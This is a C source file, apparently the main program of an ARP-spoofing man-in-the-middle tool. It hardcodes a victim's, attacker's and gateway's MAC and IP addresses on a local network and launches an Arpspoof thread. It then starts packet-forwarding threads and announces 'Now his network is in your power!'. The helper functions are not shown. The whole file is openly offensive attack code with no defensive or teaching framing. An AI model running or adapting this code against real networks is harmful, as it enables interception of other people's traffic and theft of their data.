#include "head.h"

int main(void) {

    /* get information */
    u_char victim_mac[6] = {0xbc,0x9f,0xef,0xd3,0x7b,0xe4};
    u_char attacker_mac[6] = {0x00,0xc2,0xc6,0xb9,0x4d,0x80};
    u_char gateway_mac[6] = {0xb0, 0x51,0x8e,0x04,0xfd,0x43};
    u_char victim_ip[4] = {192,168,49,42};
    u_char gateway_ip[4] = {192,168,48,1};

    /* get filter and device */
    char *device = "wlp1s0";
    char *filter_app = "ip and ether dst 00:c2:c6:b9:4d:80";

    /* build info */
    MITM_info MITM_arg;
    MITM_arg.TARGET_MAC = victim_mac;
    MITM_arg.ATTACKER_MAC = attacker_mac;
    MITM_arg.GATEWAY_MAC = gateway_mac;
    MITM_arg.TARGET_IP = victim_ip;
    MITM_arg.GATEWAY_IP = gateway_ip;
    MITM_arg.dev = device;
    MITM_arg.filter = filter_app;

    /* multiplythreading */
    pthread_t thread1, thread2, thread3, thread4;
    int ret_thread1, ret_thread2, ret_thread3, ret_thread4;

    /* arpspoof */
    printf("ATTACK!\n");    
    ret_thread1 = pthread_create(&thread1, NULL, (void *)&Arpspoof, (void *)&MITM_arg);
    
    /* forward */
    sleep(10);
    printf("Now his network is in your power!\n");
    ret_thread2 = pthread_create(&thread2, NULL, (void *)&forward_packet, (void *)&MITM_arg);
    ret_thread3 = pthread_create(&thread3, NULL, (void *)&forward_packet, (void *)&MITM_arg);

    /* before end */
    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);
    pthread_join(thread3, NULL);
    return 0;
}